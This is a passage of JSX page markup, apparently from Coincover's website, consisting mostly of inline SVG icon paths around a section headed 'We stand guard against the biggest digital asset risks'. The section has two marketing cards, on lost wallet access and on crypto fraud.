                                        <g clipPath="url(#clip0_1981_63494)">
                                          <path
                                            d="M9.99304 0.273922C10.1372 0.273922 10.2669 0.302755 10.4111 0.360418C10.5408 0.418081 10.6562 0.49016 10.7571 0.59107C10.9589 0.792891 11.0742 1.06679 11.0742 1.35511C11.0742 1.49926 11.0454 1.64342 10.9877 1.77316C10.9301 1.90291 10.858 2.01823 10.7571 2.11914C10.3534 2.52279 9.63264 2.52279 9.229 2.11914C9.02718 1.91732 8.91185 1.64342 8.91185 1.35511C8.91185 1.06679 9.02718 0.792891 9.229 0.59107C9.43082 0.389249 9.70472 0.273922 9.99304 0.273922Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M7.95989 3.40199C8.37795 3.82005 8.37795 4.49759 7.95989 4.93007C7.52742 5.34812 6.84988 5.34812 6.43182 4.93007C5.99935 4.51201 5.99935 3.82005 6.43182 3.40199C6.64806 3.18576 6.92196 3.08485 7.19586 3.08485C7.48417 3.08485 7.75807 3.18576 7.97431 3.40199H7.95989ZM5.14882 6.19866C5.56687 6.63113 5.56687 7.30867 5.14882 7.74114C4.73076 8.1592 4.0388 8.1592 3.62074 7.74114C3.20269 7.30867 3.20269 6.63113 3.62074 6.19866C3.83698 5.99684 4.11088 5.89592 4.38478 5.89592C4.65868 5.89592 4.93258 5.99684 5.14882 6.19866Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M1.58679 8.68799C1.86068 8.68799 2.149 8.80331 2.35082 9.00513C2.55264 9.20695 2.66797 9.49527 2.66797 9.76917C2.66797 9.91333 2.63914 10.0575 2.58147 10.1872C2.52381 10.317 2.45173 10.4323 2.35082 10.5332C1.94718 10.9368 1.22639 10.9368 0.822749 10.5332C0.620928 10.3314 0.505601 10.0575 0.505601 9.76917C0.505601 9.48085 0.620928 9.20695 0.822749 9.00513C1.02457 8.80331 1.29847 8.68799 1.58679 8.68799Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M5.14761 11.8161C5.56567 12.2341 5.56567 12.9261 5.14761 13.3441C4.71513 13.7622 4.03759 13.7622 3.61953 13.3441C3.18706 12.9261 3.20148 12.2341 3.61953 11.8161C3.83577 11.5998 4.10967 11.4989 4.38357 11.4989C4.65747 11.4989 4.93137 11.5998 5.14761 11.8161ZM7.94427 14.6271C8.36233 15.0452 8.36233 15.7227 7.94427 16.1552C7.52621 16.5733 6.83425 16.5733 6.4162 16.1552C5.99814 15.7227 5.99814 15.0452 6.4162 14.6271C6.63243 14.4109 6.90633 14.31 7.18023 14.31C7.45413 14.31 7.72803 14.4109 7.94427 14.6271Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M9.97741 17.1083C10.1216 17.1083 10.2657 17.1371 10.3955 17.1948C10.5252 17.2524 10.6405 17.3389 10.7414 17.4254C10.9433 17.6272 11.0586 17.9156 11.0586 18.2039C11.0586 18.4922 10.9433 18.7661 10.7414 18.9679C10.6405 19.0544 10.5252 19.1409 10.3955 19.1986C9.99183 19.3571 9.5161 19.2562 9.21337 18.9679C9.01155 18.7661 8.89623 18.4778 8.89623 18.2039C8.89623 17.9156 9.01155 17.6272 9.21337 17.4254C9.41519 17.2236 9.68909 17.1083 9.97741 17.1083Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M18.411 8.68799C18.6849 8.68799 18.9732 8.80331 19.175 9.00513C19.3769 9.20695 19.4922 9.49527 19.4922 9.76917C19.4922 10.0575 19.3769 10.3458 19.175 10.5332C18.7714 10.9368 18.0362 10.9368 17.647 10.5332C17.4451 10.3458 17.3298 10.0575 17.3298 9.76917C17.3298 9.48085 17.4451 9.20695 17.647 9.00513C17.8488 8.80331 18.1227 8.68799 18.411 8.68799Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M12.0241 9.77038C12.0241 10.3758 11.534 10.8516 10.9429 10.8516C10.3519 10.8516 9.86176 10.3758 9.86176 9.77038C9.86176 9.17933 10.3519 8.6892 10.9429 8.6892C11.534 8.6892 12.0241 9.17933 12.0241 9.77038ZM15.7578 9.77038C15.7578 10.3758 15.2677 10.8516 14.6766 10.8516C14.0712 10.8516 13.5954 10.3758 13.5954 9.77038C13.5954 9.17933 14.0712 8.6892 14.6766 8.6892C15.2677 8.6892 15.7578 9.17933 15.7578 9.77038Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M7.21178 8.68799C7.5001 8.68799 7.774 8.80331 7.97582 9.00513C8.17764 9.20695 8.29297 9.49527 8.29297 9.76917C8.29297 10.0575 8.17764 10.3458 7.97582 10.5332C7.57218 10.9368 6.85139 10.9368 6.44775 10.5332C6.24593 10.3458 6.1306 10.0575 6.1306 9.76917C6.1306 9.48085 6.24593 9.20695 6.44775 9.00513C6.64957 8.80331 6.92347 8.68799 7.21178 8.68799Z"
                                            fill="#A6ADBA"
                                          />
                                        </g>
                                        <defs>
                                          <clipPath id="clip0_1981_63494">
                                            <rect
                                              width="18.9856"
                                              height={19}
                                              fill="white"
                                              transform="matrix(-1 0 0 -1 19.4922 19.2734)"
                                            />
                                          </clipPath>
                                        </defs>
                                      </svg>
                                    </div>
                                    <div className="slide-count secondary-text-size-small">
                                      <span className="current_slide_t">1</span>
                                      /<span className="total_slide_t">4</span>
                                    </div>
                                    <div className="next_arrow">
                                      <svg
                                        width={20}
                                        height={20}
                                        viewBox="0 0 20 20"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <g clipPath="url(#clip0_1981_65839)">
                                          <path
                                            d="M10.007 19.273C9.86281 19.273 9.73307 19.2441 9.58891 19.1865C9.45917 19.1288 9.34384 19.0567 9.24293 18.9558C9.04111 18.754 8.92578 18.4801 8.92578 18.1918C8.92578 18.0476 8.95461 17.9035 9.01228 17.7737C9.06994 17.644 9.14202 17.5286 9.24293 17.4277C9.64657 17.0241 10.3674 17.0241 10.771 17.4277C10.9728 17.6296 11.0881 17.9035 11.0881 18.1918C11.0881 18.4801 10.9728 18.754 10.771 18.9558C10.5692 19.1576 10.2953 19.273 10.007 19.273Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M12.0401 16.1449C11.622 15.7268 11.622 15.0493 12.0401 14.6168C12.4726 14.1988 13.1501 14.1988 13.5682 14.6168C14.0007 15.0349 14.0007 15.7268 13.5682 16.1449C13.3519 16.3611 13.078 16.462 12.8041 16.462C12.5158 16.462 12.2419 16.3611 12.0257 16.1449H12.0401ZM14.8512 13.3482C14.4331 12.9157 14.4331 12.2382 14.8512 11.8057C15.2692 11.3877 15.9612 11.3877 16.3793 11.8057C16.7973 12.2382 16.7973 12.9157 16.3793 13.3482C16.163 13.55 15.8891 13.651 15.6152 13.651C15.3413 13.651 15.0674 13.55 14.8512 13.3482Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M18.4132 10.8589C18.1393 10.8589 17.851 10.7436 17.6492 10.5417C17.4474 10.3399 17.332 10.0516 17.332 9.77771C17.332 9.63355 17.3609 9.48939 17.4185 9.35965C17.4762 9.22991 17.5483 9.11458 17.6492 9.01367C18.0528 8.61003 18.7736 8.61003 19.1773 9.01367C19.3791 9.21549 19.4944 9.48939 19.4944 9.77771C19.4944 10.066 19.3791 10.3399 19.1773 10.5417C18.9754 10.7436 18.7015 10.8589 18.4132 10.8589Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M14.8524 7.73082C14.4343 7.31276 14.4343 6.6208 14.8524 6.20275C15.2849 5.78469 15.9624 5.78469 16.3805 6.20275C16.8129 6.6208 16.7985 7.31276 16.3805 7.73082C16.1642 7.94705 15.8903 8.04796 15.6164 8.04796C15.3425 8.04796 15.0686 7.94705 14.8524 7.73082ZM12.0557 4.91974C11.6377 4.50168 11.6377 3.82414 12.0557 3.39167C12.4738 2.97361 13.1657 2.97361 13.5838 3.39167C14.0019 3.82414 14.0019 4.50168 13.5838 4.91974C13.3676 5.13598 13.0937 5.23689 12.8198 5.23689C12.5459 5.23689 12.272 5.13598 12.0557 4.91974Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M10.0226 2.4386C9.87843 2.4386 9.73427 2.40977 9.60453 2.35211C9.47479 2.29445 9.35946 2.20795 9.25855 2.12146C9.05673 1.91964 8.94141 1.63132 8.94141 1.34301C8.94141 1.05469 9.05673 0.78079 9.25855 0.578969C9.35946 0.492474 9.47479 0.40598 9.60453 0.348317C10.0082 0.189743 10.4839 0.290653 10.7866 0.578969C10.9884 0.78079 11.1038 1.06911 11.1038 1.34301C11.1038 1.63132 10.9884 1.91964 10.7866 2.12146C10.5848 2.32328 10.3109 2.4386 10.0226 2.4386Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M1.589 10.8589C1.3151 10.8589 1.02678 10.7436 0.82496 10.5417C0.623139 10.3399 0.507813 10.0516 0.507813 9.77771C0.507812 9.48939 0.623139 9.20107 0.82496 9.01367C1.2286 8.61003 1.96381 8.61003 2.35303 9.01367C2.55485 9.20107 2.67018 9.48939 2.67018 9.77771C2.67018 10.066 2.55485 10.3399 2.35303 10.5417C2.15121 10.7436 1.87731 10.8589 1.589 10.8589Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M7.97588 9.7765C7.97588 9.17103 8.46601 8.69531 9.05706 8.69531C9.64811 8.69531 10.1382 9.17103 10.1382 9.7765C10.1382 10.3675 9.64811 10.8577 9.05706 10.8577C8.46601 10.8577 7.97588 10.3675 7.97588 9.7765ZM4.24219 9.7765C4.24219 9.17103 4.73232 8.69531 5.32337 8.69531C5.92883 8.69531 6.40456 9.17103 6.40456 9.7765C6.40456 10.3675 5.92883 10.8577 5.32337 10.8577C4.73232 10.8577 4.24219 10.3675 4.24219 9.7765Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M12.7882 10.8589C12.4999 10.8589 12.226 10.7436 12.0242 10.5417C11.8224 10.3399 11.707 10.0516 11.707 9.77771C11.707 9.48939 11.8224 9.20107 12.0242 9.01367C12.4278 8.61003 13.1486 8.61003 13.5523 9.01367C13.7541 9.20107 13.8694 9.48939 13.8694 9.77771C13.8694 10.066 13.7541 10.3399 13.5523 10.5417C13.3504 10.7436 13.0765 10.8589 12.7882 10.8589Z"
                                            fill="#3939EF"
                                          />
                                        </g>
                                        <defs>
                                          <clipPath id="clip0_1981_65839">
                                            <rect
                                              width="18.9856"
                                              height={19}
                                              fill="white"
                                              transform="translate(0.507812 0.273438)"
                                            />
                                          </clipPath>
                                        </defs>
                                      </svg>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-11 dnd-section dnd_area-row-5-force-full-width-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-12 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748079969853"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="mitigating_risk_main_wrapper">
                              <div className="content-wrapper">
                                <div className="heading">
                                  <h2>
                                    We stand guard against the biggest digital
                                    asset risks
                                  </h2>
                                </div>
                                <div className="cards desk_card">
                                  <div className="card">
                                    <div className="top_content">
                                      <svg
                                        width={61}
                                        height={61}
                                        viewBox="0 0 61 61"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <rect
                                          x="24.6677"
                                          y="1.22934"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="9.47522"
                                          y="9.28903"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="32.8005"
                                          y="1.22934"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="48.0661"
                                          y="9.28903"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="1.25104"
                                          y="24.5546"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="56.1989"
                                          y="24.5546"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="1.25104"
                                          y="32.6875"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="9.47522"
                                          y="47.9531"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="24.6677"
                                          y="55.9763"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="32.8005"
                                          y="55.9763"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="56.1989"
                                          y="32.6875"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="48.0661"
                                          y="47.9531"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                      </svg>
                                    </div>
                                    <div className="bottom_content">
                                      <h3 className="title">Lost access</h3>
                                      <p className="description text-size-medium">
                                        We provide a secure way for you to
                                        recover your wallet keys. Think of us as
                                        a safety net for your business assets
                                        and customer holdings.
                                      </p>
                                      <div className="button_wrapper">
                                        <a
                                          className="blue_btn_with_arrow"
                                          href="https://www.coincover.com/risks/lost-wallet-access"
                                        >
                                          <span> Learn more</span>
                                        </a>
                                      </div>
                                    </div>
                                  </div>
                                  <div className="card">
                                    <div className="top_content">
                                      <svg
                                        width={60}
                                        height={61}
                                        viewBox="0 0 60 61"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <path
                                          d="M30 4.94978C31.1835 4.94978 32.1429 3.99039 32.1429 2.80692C32.1429 1.62345 31.1835 0.664062 30 0.664062C28.8165 0.664062 27.8571 1.62345 27.8571 2.80692C27.8571 3.99039 28.8165 4.94978 30 4.94978Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M2.14286 32.8069C3.32632 32.8069 4.28571 31.8475 4.28571 30.6641C4.28571 29.4806 3.32632 28.5212 2.14286 28.5212C0.95939 28.5212 0 29.4806 0 30.6641C0 31.8475 0.95939 32.8069 2.14286 32.8069Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M2.14286 42.0926C3.32632 42.0926 4.28571 41.1332 4.28571 39.9498C4.28571 38.7663 3.32632 37.8069 2.14286 37.8069C0.95939 37.8069 0 38.7663 0 39.9498C0 41.1332 0.95939 42.0926 2.14286 42.0926Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M4.28571 49.2355C4.28571 50.419 3.32632 51.3783 2.14286 51.3783C0.95939 51.3783 0 50.419 0 49.2355C0 48.052 0.95939 47.0926 2.14286 47.0926C3.32632 47.0926 4.28571 48.052 4.28571 49.2355Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M41.4286 2.80692C41.4286 3.99039 40.4692 4.94978 39.2857 4.94978C38.1023 4.94978 37.1429 3.99039 37.1429 2.80692C37.1429 1.62345 38.1023 0.664062 39.2857 0.664062C40.4692 0.664062 41.4286 1.62345 41.4286 2.80692Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M30 23.5212C31.1835 23.5212 32.1429 22.5618 32.1429 21.3783C32.1429 20.1949 31.1835 19.2355 30 19.2355C28.8165 19.2355 27.8571 20.1949 27.8571 21.3783C27.8571 22.5618 28.8165 23.5212 30 23.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M32.1429 58.5212C32.1429 59.7047 31.1835 60.6641 30 60.6641C28.8165 60.6641 27.8571 59.7047 27.8571 58.5212C27.8571 57.3377 28.8165 56.3783 30 56.3783C31.1835 56.3783 32.1429 57.3377 32.1429 58.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M20.7143 4.94978C21.8978 4.94978 22.8571 3.99039 22.8571 2.80692C22.8571 1.62345 21.8978 0.664062 20.7143 0.664062C19.5308 0.664062 18.5714 1.62345 18.5714 2.80692C18.5714 3.99039 19.5308 4.94978 20.7143 4.94978Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M22.8571 21.3783C22.8571 22.5618 21.8978 23.5212 20.7143 23.5212C19.5308 23.5212 18.5714 22.5618 18.5714 21.3783C18.5714 20.1949 19.5308 19.2355 20.7143 19.2355C21.8978 19.2355 22.8571 20.1949 22.8571 21.3783Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M20.7143 60.6641C21.8978 60.6641 22.8571 59.7047 22.8571 58.5212C22.8571 57.3377 21.8978 56.3783 20.7143 56.3783C19.5308 56.3783 18.5714 57.3377 18.5714 58.5212C18.5714 59.7047 19.5308 60.6641 20.7143 60.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M60 30.6641C60 31.8475 59.0406 32.8069 57.8571 32.8069C56.6737 32.8069 55.7143 31.8475 55.7143 30.6641C55.7143 29.4806 56.6737 28.5212 57.8571 28.5212C59.0406 28.5212 60 29.4806 60 30.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M57.8571 42.0926C59.0406 42.0926 60 41.1332 60 39.9498C60 38.7663 59.0406 37.8069 57.8571 37.8069C56.6737 37.8069 55.7143 38.7663 55.7143 39.9498C55.7143 41.1332 56.6737 42.0926 57.8571 42.0926Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M60 49.2355C60 50.419 59.0406 51.3783 57.8571 51.3783C56.6737 51.3783 55.7143 50.419 55.7143 49.2355C55.7143 48.052 56.6737 47.0926 57.8571 47.0926C59.0406 47.0926 60 48.052 60 49.2355Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M11.4286 14.2355C12.612 14.2355 13.5714 13.2761 13.5714 12.0926C13.5714 10.9092 12.612 9.94978 11.4286 9.94978C10.2451 9.94978 9.28571 10.9092 9.28571 12.0926C9.28571 13.2761 10.2451 14.2355 11.4286 14.2355Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M13.5714 21.3783C13.5714 22.5618 12.612 23.5212 11.4286 23.5212C10.2451 23.5212 9.28571 22.5618 9.28571 21.3783C9.28571 20.1949 10.2451 19.2355 11.4286 19.2355C12.612 19.2355 13.5714 20.1949 13.5714 21.3783Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M11.4286 60.6641C12.612 60.6641 13.5714 59.7047 13.5714 58.5212C13.5714 57.3377 12.612 56.3783 11.4286 56.3783C10.2451 56.3783 9.28571 57.3377 9.28571 58.5212C9.28571 59.7047 10.2451 60.6641 11.4286 60.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M41.4286 21.3783C41.4286 22.5618 40.4692 23.5212 39.2857 23.5212C38.1023 23.5212 37.1429 22.5618 37.1429 21.3783C37.1429 20.1949 38.1023 19.2355 39.2857 19.2355C40.4692 19.2355 41.4286 20.1949 41.4286 21.3783Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M48.5714 23.5212C49.7549 23.5212 50.7143 22.5618 50.7143 21.3783C50.7143 20.1949 49.7549 19.2355 48.5714 19.2355C47.388 19.2355 46.4286 20.1949 46.4286 21.3783C46.4286 22.5618 47.388 23.5212 48.5714 23.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M41.4286 58.5212C41.4286 59.7047 40.4692 60.6641 39.2857 60.6641C38.1023 60.6641 37.1429 59.7047 37.1429 58.5212C37.1429 57.3377 38.1023 56.3783 39.2857 56.3783C40.4692 56.3783 41.4286 57.3377 41.4286 58.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M48.5714 60.6641C49.7549 60.6641 50.7143 59.7047 50.7143 58.5212C50.7143 57.3377 49.7549 56.3783 48.5714 56.3783C47.388 56.3783 46.4286 57.3377 46.4286 58.5212C46.4286 59.7047 47.388 60.6641 48.5714 60.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M48.6429 14.2355C49.8263 14.2355 50.7857 13.2761 50.7857 12.0926C50.7857 10.9092 49.8263 9.94978 48.6429 9.94978C47.4594 9.94978 46.5 10.9092 46.5 12.0926C46.5 13.2761 47.4594 14.2355 48.6429 14.2355Z"
                                          fill="white"
                                        />
                                      </svg>
                                    </div>
                                    <div className="bottom_content">
                                      <h3 className="title">Crypto fraud</h3>
                                      <p className="description text-size-medium">
                                        Ransomware. Account takeovers. Social
                                        engineering. Our crypto cybersecurity
                                        protects your business and customers
                                        against sophisticated cyber attacks.
                                      </p>
                                      <div className="button_wrapper">
                                        <a
                                          className="blue_btn_with_arrow"
                                          href="https://www.coincover.com/risks/crypto-fraud"
                                        >
                                          <span> Learn more</span>
                                        </a>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div className="custom_arrow arrowsFor_small">
                                  <div className="prev-arrow">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_63494)">
                                        <path
                                          d="M9.99304 0.273922C10.1372 0.273922 10.2669 0.302755 10.4111 0.360418C10.5408 0.418081 10.6562 0.49016 10.7571 0.59107C10.9589 0.792891 11.0742 1.06679 11.0742 1.35511C11.0742 1.49926 11.0454 1.64342 10.9877 1.77316C10.9301 1.90291 10.858 2.01823 10.7571 2.11914C10.3534 2.52279 9.63264 2.52279 9.229 2.11914C9.02718 1.91732 8.91185 1.64342 8.91185 1.35511C8.91185 1.06679 9.02718 0.792891 9.229 0.59107C9.43082 0.389249 9.70472 0.273922 9.99304 0.273922Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.95989 3.40199C8.37795 3.82005 8.37795 4.49759 7.95989 4.93007C7.52742 5.34812 6.84988 5.34812 6.43182 4.93007C5.99935 4.51201 5.99935 3.82005 6.43182 3.40199C6.64806 3.18576 6.92196 3.08485 7.19586 3.08485C7.48417 3.08485 7.75807 3.18576 7.97431 3.40199H7.95989ZM5.14882 6.19866C5.56687 6.63113 5.56687 7.30867 5.14882 7.74114C4.73076 8.1592 4.0388 8.1592 3.62074 7.74114C3.20269 7.30867 3.20269 6.63113 3.62074 6.19866C3.83698 5.99684 4.11088 5.89592 4.38478 5.89592C4.65868 5.89592 4.93258 5.99684 5.14882 6.19866Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M1.58679 8.68799C1.86068 8.68799 2.149 8.80331 2.35082 9.00513C2.55264 9.20695 2.66797 9.49527 2.66797 9.76917C2.66797 9.91333 2.63914 10.0575 2.58147 10.1872C2.52381 10.317 2.45173 10.4323 2.35082 10.5332C1.94718 10.9368 1.22639 10.9368 0.822749 10.5332C0.620928 10.3314 0.505601 10.0575 0.505601 9.76917C0.505601 9.48085 0.620928 9.20695 0.822749 9.00513C1.02457 8.80331 1.29847 8.68799 1.58679 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M5.14761 11.8161C5.56567 12.2341 5.56567 12.9261 5.14761 13.3441C4.71513 13.7622 4.03759 13.7622 3.61953 13.3441C3.18706 12.9261 3.20148 12.2341 3.61953 11.8161C3.83577 11.5998 4.10967 11.4989 4.38357 11.4989C4.65747 11.4989 4.93137 11.5998 5.14761 11.8161ZM7.94427 14.6271C8.36233 15.0452 8.36233 15.7227 7.94427 16.1552C7.52621 16.5733 6.83425 16.5733 6.4162 16.1552C5.99814 15.7227 5.99814 15.0452 6.4162 14.6271C6.63243 14.4109 6.90633 14.31 7.18023 14.31C7.45413 14.31 7.72803 14.4109 7.94427 14.6271Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M9.97741 17.1083C10.1216 17.1083 10.2657 17.1371 10.3955 17.1948C10.5252 17.2524 10.6405 17.3389 10.7414 17.4254C10.9433 17.6272 11.0586 17.9156 11.0586 18.2039C11.0586 18.4922 10.9433 18.7661 10.7414 18.9679C10.6405 19.0544 10.5252 19.1409 10.3955 19.1986C9.99183 19.3571 9.5161 19.2562 9.21337 18.9679C9.01155 18.7661 8.89623 18.4778 8.89623 18.2039C8.89623 17.9156 9.01155 17.6272 9.21337 17.4254C9.41519 17.2236 9.68909 17.1083 9.97741 17.1083Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M18.411 8.68799C18.6849 8.68799 18.9732 8.80331 19.175 9.00513C19.3769 9.20695 19.4922 9.49527 19.4922 9.76917C19.4922 10.0575 19.3769 10.3458 19.175 10.5332C18.7714 10.9368 18.0362 10.9368 17.647 10.5332C17.4451 10.3458 17.3298 10.0575 17.3298 9.76917C17.3298 9.48085 17.4451 9.20695 17.647 9.00513C17.8488 8.80331 18.1227 8.68799 18.411 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M12.0241 9.77038C12.0241 10.3758 11.534 10.8516 10.9429 10.8516C10.3519 10.8516 9.86176 10.3758 9.86176 9.77038C9.86176 9.17933 10.3519 8.6892 10.9429 8.6892C11.534 8.6892 12.0241 9.17933 12.0241 9.77038ZM15.7578 9.77038C15.7578 10.3758 15.2677 10.8516 14.6766 10.8516C14.0712 10.8516 13.5954 10.3758 13.5954 9.77038C13.5954 9.17933 14.0712 8.6892 14.6766 8.6892C15.2677 8.6892 15.7578 9.17933 15.7578 9.77038Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.21178 8.68799C7.5001 8.68799 7.774 8.80331 7.97582 9.00513C8.17764 9.20695 8.29297 9.49527 8.29297 9.76917C8.29297 10.0575 8.17764 10.3458 7.97582 10.5332C7.57218 10.9368 6.85139 10.9368 6.44775 10.5332C6.24593 10.3458 6.1306 10.0575 6.1306 9.76917C6.1306 9.48085 6.24593 9.20695 6.44775 9.00513C6.64957 8.80331 6.92347 8.68799 7.21178 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_63494">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="matrix(-1 0 0 -1 19.4922 19.2734)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                  <div className="next-arrow">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_65839)">
                                        <path
                                          d="M10.007 19.273C9.86281 19.273 9.73307 19.2441 9.58891 19.1865C9.45917 19.1288 9.34384 19.0567 9.24293 18.9558C9.04111 18.754 8.92578 18.4801 8.92578 18.1918C8.92578 18.0476 8.95461 17.9035 9.01228 17.7737C9.06994 17.644 9.14202 17.5286 9.24293 17.4277C9.64657 17.0241 10.3674 17.0241 10.771 17.4277C10.9728 17.6296 11.0881 17.9035 11.0881 18.1918C11.0881 18.4801 10.9728 18.754 10.771 18.9558C10.5692 19.1576 10.2953 19.273 10.007 19.273Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.0401 16.1449C11.622 15.7268 11.622 15.0493 12.0401 14.6168C12.4726 14.1988 13.1501 14.1988 13.5682 14.6168C14.0007 15.0349 14.0007 15.7268 13.5682 16.1449C13.3519 16.3611 13.078 16.462 12.8041 16.462C12.5158 16.462 12.2419 16.3611 12.0257 16.1449H12.0401ZM14.8512 13.3482C14.4331 12.9157 14.4331 12.2382 14.8512 11.8057C15.2692 11.3877 15.9612 11.3877 16.3793 11.8057C16.7973 12.2382 16.7973 12.9157 16.3793 13.3482C16.163 13.55 15.8891 13.651 15.6152 13.651C15.3413 13.651 15.0674 13.55 14.8512 13.3482Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M18.4132 10.8589C18.1393 10.8589 17.851 10.7436 17.6492 10.5417C17.4474 10.3399 17.332 10.0516 17.332 9.77771C17.332 9.63355 17.3609 9.48939 17.4185 9.35965C17.4762 9.22991 17.5483 9.11458 17.6492 9.01367C18.0528 8.61003 18.7736 8.61003 19.1773 9.01367C19.3791 9.21549 19.4944 9.48939 19.4944 9.77771C19.4944 10.066 19.3791 10.3399 19.1773 10.5417C18.9754 10.7436 18.7015 10.8589 18.4132 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M14.8524 7.73082C14.4343 7.31276 14.4343 6.6208 14.8524 6.20275C15.2849 5.78469 15.9624 5.78469 16.3805 6.20275C16.8129 6.6208 16.7985 7.31276 16.3805 7.73082C16.1642 7.94705 15.8903 8.04796 15.6164 8.04796C15.3425 8.04796 15.0686 7.94705 14.8524 7.73082ZM12.0557 4.91974C11.6377 4.50168 11.6377 3.82414 12.0557 3.39167C12.4738 2.97361 13.1657 2.97361 13.5838 3.39167C14.0019 3.82414 14.0019 4.50168 13.5838 4.91974C13.3676 5.13598 13.0937 5.23689 12.8198 5.23689C12.5459 5.23689 12.272 5.13598 12.0557 4.91974Z"
                                          fill="#3939EF"
                                        />
                                        <path
